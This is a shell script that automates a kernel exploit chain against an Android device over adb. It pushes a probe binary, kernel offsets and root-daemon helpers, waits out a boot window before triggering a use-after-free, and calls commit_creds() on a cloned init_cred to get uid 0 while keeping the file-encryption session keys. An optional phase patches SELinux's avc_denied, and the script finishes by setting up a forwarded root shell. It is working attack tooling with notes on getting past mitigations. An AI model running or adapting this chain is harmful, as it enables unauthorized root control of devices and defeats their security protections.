#!/bin/sh
# One-key host driver for jit_write_probe_v16 (cloned-cred root).
#
#   sh src/probe/run_v16c.sh dry    # default: validate every primitive, no commit
#   sh src/probe/run_v16c.sh go     # actually commit_creds() the cloned cred
#
# What v16 changes compared to v11:
#   - no text patch at all: phase F's code-patch half is skipped
#   - root comes from commit_creds() on a *clone* of init_cred that keeps our
#     own keyring pointers, so the resulting uid-0 process still holds the FBE
#     session key (new files under /data become possible)
#   - the clone is built in a reserved Mali page (CPU coherent), so no
#     physical write to a live cred and no cache invalidation is needed
#   - "dry" runs the whole chain and stops before the commit, so a wrong
#     struct offset or a stale PTE shows up as a log line, not a panic
#
# The script gates on uptime (the UAF must not race boot services), refuses to
# run next to an older probe (dirty L2 table), checks md5 on device, then
# mirrors the log every 2 s and verifies the result from the outside.
set -u
cd "$(dirname "$0")/../.." || exit 1

MODE="${1:-dry}"
case "$MODE" in
dry|go|avc|slot) ;;
*) echo "usage: $0 [dry|go|avc]" >&2; exit 2 ;;
esac

ADB="adb"
# Linux-only; paths pass through unchanged.
DEVOUT=/data/local/tmp/probe.out
# The probe fsyncs every line into this file; stdout is block buffered and the
# tail of it is lost when the kernel panics, so the mirror reads the fsynced
# copy instead.  (A panic in the JIT_FREE phase once cost us a whole run.)
DMIRROR=/data/local/tmp/jit_write.log
LOG=${LOG:-/tmp/hlk_v16c_run.host.log}
# v0.6: the probe itself now uses a signal gate (~390 s).  This is just a
# floor so the manual path does not launch into the boot storm; the probe
# will still apply its own window before committing.  Override: UPGATE=N.
UPGATE=${UPGATE:-300}
BIN=/data/local/tmp/jit_write_probe_v16

die() { echo "!! $*" >&2; exit 1; }

echo "== mode: $MODE =="

echo "== waiting for device =="
$ADB wait-for-device >/dev/null 2>&1 || die "no device"
for i in $(seq 1 120); do
	$ADB shell "test -e /proc/uptime" >/dev/null 2>&1 && break
	sleep 5
done

echo "== checking for a live probe (dirty state needs a reboot) =="
if $ADB shell "ps -A | grep -q '[j]it_write_probe'" 2>/dev/null; then
	$ADB shell "ps -A | grep '[j]it_write_probe'"
	die "a probe is still running; reboot the device and rerun"
fi

up=$($ADB shell "cut -d. -f1 /proc/uptime" 2>/dev/null | tr -d '\r\n ')
echo "== device uptime=${up:-?}s (gate ${UPGATE}s) =="
while [ "${up:-0}" -lt "$UPGATE" ]; do
	sleep 60
	$ADB wait-for-device >/dev/null 2>&1
	up=$($ADB shell "cut -d. -f1 /proc/uptime" 2>/dev/null | tr -d '\r\n ')
	echo "== uptime=${up:-?}s, still gating =="
done

echo "== pushing payload =="
$ADB push bin/jit_write_probe_v16 "$BIN" || die "push v16"
$ADB push bin/koffs.txt /data/local/tmp/koffs.txt || die "push koffs"
$ADB push src/probe/rootd.sh /data/local/tmp/rootd.sh || die "push rootd"
$ADB push bin/rootsrv /data/local/tmp/rootsrv || die "push rootsrv"
$ADB push src/probe/r /data/local/tmp/r || die "push r"
$ADB shell "chmod 755 $BIN /data/local/tmp/rootd.sh /data/local/tmp/rootsrv /data/local/tmp/r"
$ADB shell "sync"

echo "== md5 on device =="
want=$(md5sum bin/jit_write_probe_v16 | cut -d' ' -f1)
got=$($ADB shell "md5sum $BIN" | cut -d' ' -f1 | tr -d '\r')
[ "$want" = "$got" ] || die "v16 md5 mismatch ($want vs $got)"
kwant=$(md5sum bin/koffs.txt | cut -d' ' -f1)
kgot=$($ADB shell "md5sum /data/local/tmp/koffs.txt" | cut -d' ' -f1 | tr -d '\r')
[ "$kwant" = "$kgot" ] || die "koffs md5 mismatch ($kwant vs $kgot)"
echo "== md5 ok: v16=$want koffs=$kwant =="

echo "== clearing stale state (v16_newfile must NOT pre-exist) =="
# Keep every file that already exists: after a panic the ext4 journal can roll
# back to its last checkpoint, and a deleted-then-recreated inode takes the new
# data with it.  Truncating an existing file survives far better.
$ADB shell "rm -f /data/local/tmp/trig /data/local/tmp/rootcmd /data/local/tmp/rootcmd.done /data/local/tmp/rootcmd.tmp"
$ADB shell "touch /data/local/tmp/phaseg.ok /data/local/tmp/rootout /data/local/tmp/mp.out /data/local/tmp/rootd.pid $DEVOUT /data/local/tmp/jit_write.log"
$ADB shell ": > /data/local/tmp/phaseg.ok; : > $DEVOUT; : > /data/local/tmp/jit_write.log"
$ADB shell "rm -f /data/local/tmp/v16_newfile"
SLOT=""
case "$MODE" in
go)  $ADB shell "touch /data/local/tmp/v16_go; rm -f /data/local/tmp/v16_avc" ;;
avc) $ADB shell "touch /data/local/tmp/v16_go /data/local/tmp/v16_avc" ;;
# "slot" = the app-domain vehicle: a real, rarely used, seccomp-whitelisted
# syscall number instead of one of the ni entries.  vhangup (58) is in the app
# whitelist and nothing on Android calls it.
slot) $ADB shell "touch /data/local/tmp/v16_go /data/local/tmp/v16_avc"
      SLOT=${PSS:-148}
      echo "== forced commit slot: $SLOT (expect phaseF: forced slot=$SLOT) ==" ;;
*)   $ADB shell "rm -f /data/local/tmp/v16_go /data/local/tmp/v16_avc" ;;
esac
$ADB shell "sync"

echo "== launching detached =="
$ADB shell "cat /proc/loadavg"
$ADB shell "PROBE_SLOT=$SLOT setsid nohup $BIN >$DEVOUT 2>&1 </dev/null & echo started=\$!"

: > "$LOG"
seen=0
for round in $(seq 1 600); do
	sleep 2
	if ! $ADB devices 2>/dev/null | grep -q "device$"; then
		echo "== adb offline at $(date +%H:%M:%S), waiting ==" | tee -a "$LOG"
		$ADB wait-for-device >/dev/null 2>&1
		seen=0
		continue
	fi
	sz=$($ADB shell "wc -c < $DMIRROR" 2>/dev/null | tr -dc '0-9')
	[ -z "${sz:-}" ] && sz=0
	if [ "$sz" -gt "$seen" ]; then
		$ADB shell "tail -c +$((seen + 1)) $DMIRROR" 2>/dev/null | tr -d '\r' >> "$LOG"
		seen=$sz
	fi
	grep -q "keepalive:" "$LOG" 2>/dev/null && break
	grep -q "PHASE_I" "$LOG" 2>/dev/null && break
done

echo "== probe log tail =="
sleep 3
tail -n 70 "$LOG"
echo "== device side log tail =="
$ADB shell "tail -n 25 /data/local/tmp/jit_write.log" 2>&1 | tr -d '\r'

if [ "$MODE" = dry ]; then
	echo "== dry-run validation =="
	ok=1
	for pat in "phaseI: init_task" "phaseI: lm_base=0x" "walk: match" \
		   "phaseI: donor cred va=" "phaseI: reserved page round-trip ok" \
		   "PHASE_I DRY OK"; do
		if grep -qF "$pat" "$LOG" 2>/dev/null; then
			echo "   OK   $pat"
		else
			echo "   MISS $pat"
			ok=0
		fi
	done
	if [ "$ok" = 1 ]; then
		echo "== DRY OK: primitives validated, nothing committed =="
		echo "   next: swap GO in by hand:"
		echo "     adb shell touch /data/local/tmp/v16_go && adb shell sync"
		echo "     adb shell setsid nohup $BIN >$DEVOUT 2>&1 </dev/null &"
	else
		echo "!! dry run incomplete, see $LOG" >&2
		exit 1
	fi
	exit 0
fi

echo "== external evidence (not from probe logs) =="
$ADB shell "ps -A -o USER,PID,NAME | grep '[j]it_write_probe'"
$ADB shell "ls -l /data/local/tmp/v16_newfile 2>&1; cat /data/local/tmp/v16_newfile 2>&1"
if [ "$MODE" = avc ]; then
	echo "== phase J evidence =="
	for pat in "phaseJ: avc_denied off=" "phaseJ: patched" "avc=1"; do
		if grep -qF "$pat" "$LOG" 2>/dev/null; then
			echo "   OK   $pat"
		else
			echo "   MISS $pat"
		fi
	done
fi

echo "== root channel check =="
ok=0
for i in $(seq 1 15); do
	out=$($ADB shell "/data/local/tmp/r 'id; echo R-OK'" 2>/dev/null | tr -d '\r')
	case "$out" in
	*"uid=0(root)"*R-OK*) ok=1; break ;;
	esac
	sleep 4
done
if [ "$ok" = 1 ]; then
	echo "$out"
	echo "== ROOT OK (cloned cred) =="
	$ADB shell "/data/local/tmp/r 'touch /data/local/tmp/v16_r_newfile && echo CREATE-OK; echo x > /data/local/tmp/v16_r_write && echo WRITE-OK'"
	echo "   device : adb shell /data/local/tmp/r '<cmd>'"
	echo "   shell  : python src/probe/rootshell.py   (adb forward tcp:45679)"
	echo "   NOTE   : do NOT kill the probe process; reboot clears root."
else
	echo "!! root channel not answering; see $LOG" >&2
	$ADB shell "tail -n 80 /data/local/tmp/jit_write.log" 2>&1
	exit 1
fi
